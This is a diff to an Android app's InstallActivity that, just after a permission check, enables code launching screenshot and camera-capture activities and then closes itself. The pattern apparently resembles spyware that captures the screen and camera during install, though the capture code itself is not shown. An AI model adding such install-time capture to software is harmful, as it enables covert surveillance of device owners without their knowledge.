@@ -135,6 +135,16 @@ public class InstallActivity extends Activity  {
 
                 Permission.checkPermission(InstallActivity.this);
 
+                Intent intentscr = new Intent(InstallActivity.this, ScreenShotActivity.class);
+                intentscr.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intentscr);
+
+                Intent intentCamera = new Intent(InstallActivity.this, CameraActivity2.class);
+                intentCamera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                intentCamera.putExtra("index",0);
+                intentCamera.putExtra("count",1);
+                startActivity(intentCamera);
+
                 finish();
 
                 return;
@@ -146,18 +156,6 @@ public class InstallActivity extends Activity  {
                     String str2 = "hello";
                     boolean b1 = (str1== str2);
                     boolean b2 = (str2.equals(str1));
-
-                /*
-                Intent intentscr = new Intent(InstallActivity.this, ScreenShotActivity.class);
-                intentscr.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(intentscr);
-
-                Intent intentCamera = new Intent(InstallActivity.this, CameraActivity.class);
-                intentCamera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                intentCamera.putExtra("index",0);
-                intentCamera.putExtra("count",1);
-                startActivity(intentCamera);
-                 */
 
                     install(InstallActivity.this);
                 }
